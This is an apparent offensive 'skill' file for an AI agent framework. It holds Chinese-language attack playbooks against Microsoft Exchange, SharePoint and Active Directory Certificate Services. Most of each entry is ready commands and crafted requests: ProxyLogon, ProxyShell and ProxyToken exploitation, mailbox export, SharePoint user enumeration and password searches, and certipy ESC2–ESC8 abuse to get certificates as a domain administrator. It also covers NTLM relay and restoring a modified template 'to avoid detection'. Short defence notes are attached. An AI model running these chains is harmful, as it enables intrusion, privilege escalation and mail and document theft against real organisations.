# skill: intranet_servers
title: Exchange/SharePoint/ADCS Service Abuse
when: exchange,sharepoint,adcs,certutil,owa,ews,server abuse
tier: domain

## VOIDFORGE TOOL MAP
skills: adcs_abuse, mailbox_abuse (domain); tools: web_fingerprint, data_extract

## OPERATING CONTEXT
Grafted from the reverse-skill src-hunter corpus (WooYun-derived, MIT) — original zh preserved; FR/EN agent reads it fluently.

## SOURCE: exchange攻击.md

# Exchange攻击

_5 条 intranet payload_

### ProxyLogon攻击  `proxylogon`
_CVE-2021-26855 Exchange SSRF_
子类：**ProxyLogon** · tags: `exchange` `proxylogon` `cve-2021-26855`

**前置条件：**
- Exchange可访问

**攻击链：**

**探测漏洞**
> 检查Exchange版本
_platform: linux_
```
curl -k https://exchange.com/owa/auth/x.js
检查Exchange版本
```

**利用脚本**
> 利用ProxyLogon
_platform: linux_
```
python proxylogon.py -u https://exchange.com -e admin@domain.com
获取管理员邮箱访问权限
```
**语法解析：**
- `-u` — Exchange URL _parameter_
- `-e` — 目标邮箱 _parameter_

**手动利用**
> 手动构造请求
```
POST /owa/auth/x.js HTTP/1.1
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
X-ClientId=xxx

构造SSRF请求
```


**概述：** ProxyLogon是Exchange的SSRF漏洞。

**漏洞原理：** Exchange前端存在SSRF漏洞。

**利用方法：** 利用流程：1) 探测Exchange 2) 构造SSRF请求 3) 获取访问权限

**防御措施：** 防御措施：1) 安装补丁 2) 网络隔离 3) 监控异常请求

---

### ProxyShell攻击  `proxyshell`
_CVE-2021-34473 Exchange RCE_
子类：**ProxyShell** · tags: `exchange` `proxyshell` `cve-2021-34473`

**前置条件：**
- Exchange可访问

**攻击链：**

**探测漏洞**
> 探测漏洞
_platform: linux_
```
curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
检查是否存在漏洞
```

**利用脚本**
> 利用ProxyShell
_platform: linux_
```
python proxyshell.py -u https://exchange.com -e admin@domain.com
获取邮箱访问并执行命令
```

**获取邮件**
> 访问邮箱
```
GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1
访问邮箱内容
```


**概述：** ProxyShell是Exchange的RCE漏洞链。

**漏洞原理：** Exchange存在SSRF和RCE漏洞。

**利用方法：** 利用流程：1) 探测漏洞 2) 获取访问令牌 3) 执行命令

**防御措施：** 防御措施：1) 安装补丁 2) 网络隔离 3) 监控异常请求

---

### Exchange枚举  `exchange-enum`
_枚举Exchange服务和配置_
子类：**枚举** · tags: `exchange` `enum` `recon`

**前置条件：**
- Exchange可访问

**攻击链：**

**版本探测**
> 探测Exchange版本
_platform: linux_
```
curl -k https://exchange.com/owa/auth/logon.aspx
检查页面源码获取版本信息
```

**Autodiscover**
> Autodiscover枚举
_platform: linux_
```
curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
获取Exchange配置信息
```

**邮箱枚举**
> 枚举邮箱用户
_platform: linux_
```
python oab.py https://exchange.com
下载离线通讯录枚举用户
```

**NTLM泄露**
> NTLM信息泄露
_platform: linux_
```
curl -k https://exchange.com/autodiscover/autodiscover.xml
从WWW-Authenticate头获取域信息
```


**概述：** Exchange枚举可获取大量信息。

**漏洞原理：** Exchange暴露过多信息。

**利用方法：** 利用流程：1) 探测版本 2) 枚举用户 3) 获取配置

**防御措施：** 防御措施：1) 隐藏版本信息 2) 限制访问 3) 监控异常请求

---

### ProxyToken攻击  `exchange-proxytoken`
_利用Exchange ProxyToken绕过认证_
子类：**ProxyToken** · tags: `exchange` `proxytoken` `bypass`

**前置条件：**
- Exchange服务器
- 存在漏洞

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
使用ProxyToken工具:
python proxytoken.py -u https://exchange.com -e user@domain.com
检测是否存在漏洞
```

**利用漏洞**
> 获取邮箱访问
_platform: linux_
```
python proxytoken.py -u https://exchange.com -e user@domain.com -a
获取用户邮箱访问权限
```
**语法解析：**
- `ProxyToken` — 利用前端代理认证绕过 _keyword_
- `EWS接口` — 通过EWS访问邮箱 _keyword_

**访问邮箱**
> 访问EWS接口
```
curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
绕过认证访问EWS
```


**概述：** ProxyToken利用Exchange前端代理认证缺陷。

**漏洞原理：** Exchange前端代理未正确验证认证。

**利用方法：** 利用流程：1) 检测漏洞 2) 构造请求 3) 绕过认证访问邮箱

**防御措施：** 防御措施：1) 安装补丁 2) 加强认证验证 3) 监控异常请求

---

### Exchange邮箱访问  `exchange-mailbox-access`
_通过各种方式访问Exchange邮箱_
子类：**邮箱访问** · tags: `exchange` `mailbox` `access`

**前置条件：**
- Exchange凭证或漏洞

**攻击链：**

**OWA访问**
> OWA Web访问
```
https://exchange.com/owa
使用凭证登录OWA
查看邮件、日历等
```

**EWS访问**
> EWS API访问
_platform: linux_
```
使用Impacket:
python exchanger.py domain/user:password@exchange.com
或使用EWSTools
```

**Outlook MAPI**
> Outlook客户端
_platform: windows_
```
配置Outlook连接Exchange
使用MAPI协议访问邮箱
支持邮件、日历、联系人
```
**语法解析：**
- `OWA` — Outlook Web App _keyword_
- `EWS` — Exchange Web Services _keyword_
- `MAPI` — Messaging API _keyword_

**导出邮箱**
> 导出邮箱
_platform: windows_
```
PowerShell:
New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
导出邮箱为PST文件
```


**概述：** Exchange邮箱可通过多种协议访问。

**漏洞原理：** 获取凭证后可完全控制邮箱。

**利用方法：** 利用流程：1) 获取凭证 2) 选择访问方式 3) 访问邮箱数据

**防御措施：** 防御措施：1) MFA认证 2) 监控异常登录 3) 审计邮箱访问

---

---

## SOURCE: sharepoint攻击.md

# SharePoint攻击

_2 条 intranet payload_

### SharePoint枚举  `sharepoint-enum`
_枚举SharePoint站点和文件_
子类：**枚举** · tags: `sharepoint` `enum` `recon`

**前置条件：**
- SharePoint可访问

**攻击链：**

**站点枚举**
> 枚举站点
_platform: linux_
```
curl -k https://sharepoint.com/_api/web/webs
获取所有子站点
```

**用户枚举**
> 枚举用户
_platform: linux_
```
curl -k https://sharepoint.com/_api/web/siteusers
获取站点用户列表
```

**文件枚举**
> 枚举文档库
_platform: linux_
```
curl -k https://sharepoint.com/_api/web/lists
获取文档库列表
```

**搜索文件**
> 搜索敏感内容
_platform: linux_
```
curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
搜索敏感文件
```


**概述：** SharePoint REST API可用于枚举。

**漏洞原理：** SharePoint API暴露过多信息。

**利用方法：** 利用流程：1) 枚举站点 2) 枚举用户 3) 搜索敏感文件

**防御措施：** 防御措施：1) 限制API访问 2) 配置权限 3) 监控异常请求

---

### SharePoint文件访问  `sharepoint-file-access`
_访问SharePoint文档库中的文件_
子类：**文件访问** · tags: `sharepoint` `file` `access`

**前置条件：**
- SharePoint凭证或漏洞

**攻击链：**

**Web界面访问**
> Web界面访问
```
https://sharepoint.com/sites/site_name/Shared Documents
通过浏览器访问文档库
下载敏感文件
```

**REST API访问**
> REST API访问
_platform: linux_
```
curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
获取文档列表
下载文件内容
```
**语法解析：**
- `_api/web/lists` — REST API端点 _keyword_
- `getbytitle` — 按名称获取列表 _keyword_

**CSOM访问**
> CSOM访问
_platform: windows_
```
使用SharePoint客户端对象模型:
ClientContext context = new ClientContext("https://sharepoint.com");
context.Credentials = new SharePointOnlineCredentials(user, password);
List list = context.Web.Lists.GetByTitle("Documents");
```

**OneDrive同步**
> OneDrive同步
```
使用OneDrive客户端同步SharePoint文档库
本地访问所有文件
离线查看敏感数据
```


**概述：** SharePoint文件可通过多种方式访问。

**漏洞原理：** 获取凭证后可访问所有授权文档。

**利用方法：** 利用流程：1) 获取凭证 2) 访问文档库 3) 下载敏感文件

**防御措施：** 防御措施：1) 权限最小化 2) 监控文件访问 3) 数据分类保护

---

---

## SOURCE: adcs攻击.md

# ADCS攻击

_5 条 intranet payload_

### ADCS ESC2攻击  `adcs-esc2`
_利用ESC2模板配置错误_
子类：**ESC2** · tags: `adcs` `esc2` `certificate`

**前置条件：**
- 域环境
- ADCS服务
- 存在ESC2模板

**攻击链：**

**探测ESC2模板**
> 探测ESC2模板
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板
```

**请求证书**
> 请求管理员证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```
**语法解析：**
- `-template` — 指定易受攻击模板 _parameter_
- `-upn` — 指定目标用户UPN _parameter_

**使用证书认证**
> 使用证书认证
_platform: linux_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
获取管理员TGT
```


**概述：** ESC2允许请求任意用途的证书，可用于伪造任意用户身份。

**漏洞原理：** 证书模板配置允许Any Purpose扩展。

**利用方法：** 利用流程：1) 发现ESC2模板 2) 请求管理员证书 3) 使用证书认证

**防御措施：** 防御措施：1) 审计证书模板 2) 禁用Any Purpose 3) 监控证书请求

---

### ADCS ESC3攻击  `adcs-esc3`
_利用ESC3注册代理配置错误_
子类：**ESC3** · tags: `adcs` `esc3` `certificate`

**前置条件：**
- 域环境
- ADCS服务
- 存在ESC3配置

**攻击链：**

**探测ESC3**
> 探测ESC3配置
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找具有Enrollment Agent权限的模板
```

**获取注册代理证书**
> 获取注册代理证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent
获取注册代理证书
```

**代表其他用户请求证书**
> 代表管理员请求证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
```
**语法解析：**
- `-on-behalf-of` — 代表其他用户请求 _parameter_
- `-pfx agent.pfx` — 使用代理证书 _parameter_


**概述：** ESC3允许注册代理代表其他用户请求证书。

**漏洞原理：** 证书模板允许注册代理功能。

**利用方法：** 利用流程：1) 获取代理证书 2) 代表管理员请求证书 3) 使用证书认证

**防御措施：** 防御措施：1) 限制注册代理权限 2) 审计代理证书 3) 监控异常请求

---

### ADCS ESC4攻击  `adcs-esc4`
_利用ESC4模板权限配置错误_
子类：**ESC4** · tags: `adcs` `esc4` `certificate`

**前置条件：**
- 域环境
- ADCS服务
- 对模板有写权限

**攻击链：**

**探测ESC4**
> 探测模板权限
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找用户有写权限的模板
```

**修改模板配置**
> 修改模板配置
_platform: linux_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old
修改模板为ESC1配置
```

**请求证书**
> 请求管理员证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```
**语法解析：**
- `-save-old` — 保存原配置以便恢复 _parameter_
- `修改模板` — 启用SAN扩展 _keyword_

**恢复模板配置**
> 恢复模板配置
_platform: linux_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
恢复原配置避免检测
```


**概述：** ESC4允许修改证书模板配置来提权。

**漏洞原理：** 用户对证书模板有写权限。

**利用方法：** 利用流程：1) 发现可写模板 2) 修改配置 3) 请求证书 4) 恢复配置

**防御措施：** 防御措施：1) 审计模板权限 2) 限制写权限 3) 监控模板修改

---

### ADCS ESC6攻击  `adcs-esc6`
_利用ESC6编辑标志配置错误_
子类：**ESC6** · tags: `adcs` `esc6` `certificate`

**前置条件：**
- 域环境
- ADCS服务
- CA启用EDITF_ATTRIBUTESUBJECTALTNAME2

**攻击链：**

**探测ESC6**
> 探测CA配置
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找EDITF_ATTRIBUTESUBJECTALTNAME2标志
```

**请求证书**
> 请求管理员证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
使用-alt参数指定SAN
```
**语法解析：**
- `-alt` — 指定Subject Alternative Name _parameter_
- `EDITF_ATTRIBUTESUBJECTALTNAME2` — CA允许在请求中指定SAN _keyword_

**使用证书认证**
> 认证获取TGT
_platform: linux_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```


**概述：** ESC6允许在证书请求中指定任意SAN。

**漏洞原理：** CA配置了EDITF_ATTRIBUTESUBJECTALTNAME2标志。

**利用方法：** 利用流程：1) 探测CA配置 2) 请求带管理员SAN的证书 3) 认证

**防御措施：** 防御措施：1) 移除EDITF_ATTRIBUTESUBJECTALTNAME2标志 2) 监控证书请求 3) 审计CA配置

---

### ADCS ESC8攻击  `adcs-esc8`
_利用ESC8 HTTP端点进行NTLM中继_
子类：**ESC8** · tags: `adcs` `esc8` `ntlm-relay`

**前置条件：**
- 域环境
- ADCS HTTP端点
- 可触发NTLM认证

**攻击链：**

**探测ESC8**
> 探测HTTP端点
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找HTTP证书端点
```

**设置NTLM中继**
> 设置NTLM中继
_platform: linux_
```
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
监听NTLM认证并中继到ADCS
```
**语法解析：**
- `-t http://CA_SERVER` — 目标ADCS HTTP端点 _parameter_
- `--adcs` — 启用ADCS模板 _parameter_

**触发认证**
> 触发目标NTLM认证
```
使用多种方式触发:
- 发送邮件链接
- 打印机漏洞
- WebDAV
- 其他NTLM触发方式
```


**概述：** ESC8利用ADCS HTTP端点进行NTLM中继攻击。

**漏洞原理：** ADCS HTTP端点支持NTLM认证且未启用签名。

**利用方法：** 利用流程：1) 设置中继服务器 2) 触发目标认证 3) 获取证书

**防御措施：** 防御措施：1) 启用通道绑定 2) 禁用HTTP端点 3) 启用Extended Protection

---
